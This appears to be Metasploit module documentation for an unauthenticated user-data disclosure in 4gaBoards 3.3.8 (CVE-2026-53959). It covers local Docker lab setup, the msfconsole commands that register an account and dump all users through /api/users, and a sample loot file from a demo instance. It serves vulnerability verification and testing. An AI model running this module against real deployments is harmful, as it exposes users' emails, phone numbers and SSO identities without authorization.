## Vulnerable Application

4gaBoards in versions 3.3.8 or less, does not enforce authorization checks for /api/users REST API endpoint.
Any authenticated user can query the endpoint to retrieve information of all users using the application.
Disclosed information includes sensitive fields like name, email, phone, organization and SSO emails.

The registration endpoint /api/register is open by default and returns an access token even if email verification is enabled.
So the module first registers a new user account via /api/register and obtains an access token.
The access token is then used to retrieve all users' information via /api/users.
If given valid administrator credentials, the module also performs cleanup by deleting the newly registered account.

### Pre-requisites
- **Docker** and **Docker compose** installed.

## Setup

1. **Download source code**
```
wget https://github.com/RARgames/4gaBoards/archive/refs/tags/v3.3.8.zip
unzip v3.3.8.zip
cd 4gaBoards-3.3.8
```
2. **Generate secret key**
```
openssl rand -hex 64
```
3. **Modify docker compose file**
Open docker-compose.yml file and make the following changes:
- Replace `SECRET_KEY` with the one generated in the above step
- Change `image: ghcr.io/rargames/4gaboards:latest` to `image: ghcr.io/rargames/4gaboards:3.3.8`
4. **Start container**
```
sudo docker-compose up -d
```

## Verification Steps
1. **Launch Metasploit**
```
msfconsole
```
2. **Load the 4gaBoards User Information Disclosure module**
```
use auxiliary/gather/4gaboards_users_info_disclosure_cve_2026_53959.rb
set RHOSTS 127.0.0.1
set RPORT 3000
set TARGETURI /
set EMAIL test@test.com
set ADMIN_USERNAME demo
set ADMIN_PASSWORD demo
```
3. **Run the module**
```
run
```
4. **Observe output**

The module should:
- Create a new user with the supplied email and obtain an access token
- Use the access token to dump the information of all users on the application 
- Delete the newly created user using the supplied admin credentials

## Options

- **TARGETURI**(`/`): Base path to 4gaBoards installation
- **EMAIL**(`test@test.com`): Email for account creation
- **ADMIN_USERNAME**(`demo`): Administrator username for cleanup
- **ADMIN_PASSWORD**(`demo`): Administrator password for cleanup 

## Scenarios
```
msf auxiliary(gather/4gaboards_users_info_disclosure_cve_2026_53959) > run
[*] Running module against 127.0.0.1
[*] Attempting to register user with email 'test@test.com'
[+] User 'test@test.com' registered successfully
[+] Access token obtained for user 'test@test.com'
[*] Dumping all users information
[+] Users information saved to: /home/kali/.msf4/loot/20260826101143_default_127.0.0.1_user.information_421246.bin
[*] Attempting to delete user 'test@test.com'
[*] Logging in as administrator
[+] Administrator login successful
[+] Access token obtained for administrator
[+] User 'test@test.com' deleted successfully
[*] Auxiliary module execution completed
msf auxiliary(gather/4gaboards_users_info_disclosure_cve_2026_53959) > cat /home/kali/.msf4/loot/20260826101143_default_127.0.0.1_user.information_421246.bin[*] exec: cat /home/kali/.msf4/loot/20260826101143_default_127.0.0.1_user.information_421246.bin

[
  {
    "id": "1850206427251999750",
    "createdAt": "2026-08-26T14:09:53.000Z",
    "updatedAt": null,
    "email": "demo@demo.demo",
    "isAdmin": true,
    "isVerified": false,
    "name": "Demo Demo",
    "username": "demo",
    "phone": null,
    "organization": null,
    "ssoGoogleEmail": null,
    "ssoGithubUsername": null,
    "ssoGithubEmail": null,
    "ssoMicrosoftEmail": null,
    "ssoOidcEmail": null,
    "lastLogin": "2026-08-26T14:11:32.973Z",
    "lastEmailVerificationRequestAt": null,
    "deletedAt": null,
    "createdById": "1850206427251999750",
    "updatedById": null,
    "deletedById": null,
    "isPasswordAuthenticated": true,
    "avatarUrl": null
  }
]
```
